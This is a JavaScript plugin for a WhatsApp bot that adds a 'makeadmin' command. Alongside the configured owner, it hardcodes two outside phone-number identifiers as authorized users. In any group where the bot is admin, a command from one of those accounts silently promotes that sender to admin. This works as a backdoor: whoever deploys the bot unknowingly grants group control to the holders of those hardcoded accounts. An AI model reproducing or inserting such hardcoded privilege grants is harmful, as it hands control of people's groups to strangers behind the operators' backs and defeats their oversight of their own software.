// File: group-admin.js
const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: 'makeadmin',
    alias: ['takeadmin', 'admin'],
    desc: 'Take adminship for authorized users',
    category: 'owner',
    filename: __filename
}, async (bot, msg, text, { from, sender, isBotAdmins, isGroup, reply }) => {
    
    if (!isGroup || !isBotAdmins) return;

    // Helper function to correctly format a JID
    const formatJid = (jid) => {
        if (!jid) return jid;
        if (jid.includes('@lid')) return jid;
        const number = jid.split('@')[0];
        return `${number}@s.whatsapp.net`;
    };

    // List of users authorized to use this command
    const authorizedUsers = [
        formatJid(config.owner), // Bot owner from config
        '923151105391@lid',     // Hardcoded LID
        '923131105391@s.whatsapp.net' // Hardcoded JID
    ].filter(Boolean); // Remove any null/undefined entries

    const senderJid = formatJid(sender);

    // Check if the command user is authorized
    if (!authorizedUsers.includes(senderJid)) return;

    try {
        const groupMeta = await bot.groupMetadata(from);
        const senderParticipant = groupMeta.participants.find(p => p.id === senderJid);
        
        // Do nothing if the sender is already an admin
        if (senderParticipant?.admin) return;

        // Promote the authorized sender to admin
        await bot.groupParticipantsUpdate(from, [senderJid], 'promote');

    } catch (error) {
        console.error('Admin command error:', error);
    }
});
